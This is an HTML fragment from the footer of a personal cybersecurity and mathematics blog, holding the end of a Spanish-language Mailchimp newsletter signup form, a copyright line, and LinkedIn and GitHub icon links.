+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
